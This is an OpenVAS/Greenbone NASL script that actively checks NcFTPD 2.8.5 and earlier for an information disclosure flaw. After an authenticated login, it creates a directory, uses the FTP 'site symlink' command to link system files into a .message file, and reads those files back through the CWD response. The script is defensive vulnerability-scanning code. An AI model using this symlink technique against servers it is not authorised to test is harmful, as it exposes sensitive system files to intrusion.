# SPDX-FileCopyrightText: 2009 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100250");
  script_version("2025-09-12T05:38:45+0000");
  script_tag(name:"last_modification", value:"2025-09-12 05:38:45 +0000 (Fri, 12 Sep 2025)");
  script_tag(name:"creation_date", value:"2009-07-28 21:43:08 +0200 (Tue, 28 Jul 2009)");
  script_tag(name:"cvss_base", value:"4.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:P/I:N/A:N");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("NcFTPD <= 2.8.5 Information Disclosure Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2009 Greenbone AG");
  script_family("FTP");
  script_dependencies("ftpserver_detect_type_nd_version.nasl", "os_detection.nasl", "logins.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/ncftpd/detected");

  script_tag(name:"summary", value:"NcFTPD is prone to an information disclosure vulnerability.");

  script_tag(name:"impact", value:"Remote attackers can exploit this issue to view sensitive
  information. Information obtained may lead to further attacks.");

  script_tag(name:"affected", value:"NcFTPD version 2.8.5 and probably prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_xref(name:"URL", value:"https://web.archive.org/web/20210128150620/http://www.securityfocus.com/bid/35822");
  script_xref(name:"URL", value:"https://exchange.xforce.ibmcloud.com/vulnerabilities/52067");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("ftp_func.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("port_service_func.inc");

kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];
if ("anonymous" >< user || "ftp" >< user)
  exit(0);

port = ftp_get_port(default: 21);
banner = ftp_get_banner(port: port);
if (! banner || "NcFTPd" >!< banner)
  exit(0);

soc1 = open_sock_tcp(port);
if (!soc1)
  exit(0);

files = traversal_files();

login_details = ftp_log_in(socket: soc1, user: user, pass: pass);
if (login_details) {
  port2 = ftp_get_pasv_port(socket: soc1);
  if (port2) {
    soc2 = open_sock_tcp(port2, transport: get_port_transport(port));
    if (soc2) {
      vtstrings = get_vt_strings();
      dir = vtstrings["lowercase_rand"];

      mkdir = ftp_send_cmd(socket: soc1, cmd: string("MKD ", dir));
      if (mkdir =~ "257.*directory created") {
        foreach pattern (keys(files)) {
          file = files[pattern];

          slink = ftp_send_cmd(socket: soc1, cmd: string("site symlink /", file, " ", dir, "/.message"));
          if (slink =~ "250 Symlinked") {
            cd = ftp_send_cmd(socket: soc1, cmd: string("CWD ", dir));
            if (egrep(string: cd, pattern: pattern, icase: TRUE)) {
              close(soc2);
              ftp_close(socket: soc1);
              close(soc1);

              info = string("Here are the contents of the file '/" + file + "' that was read from the remote host:\n\n");
              info += cd;
              info += string("\n\nPlease delete the directory ");
              info += dir;
              info += string(" immediately.\n");
              security_message(port: port, data: info);
              exit(0);
            }
          }
        }
      }
      close(soc2);
    }
  }
}

ftp_close(socket: soc1);
close(soc1);

exit(99);
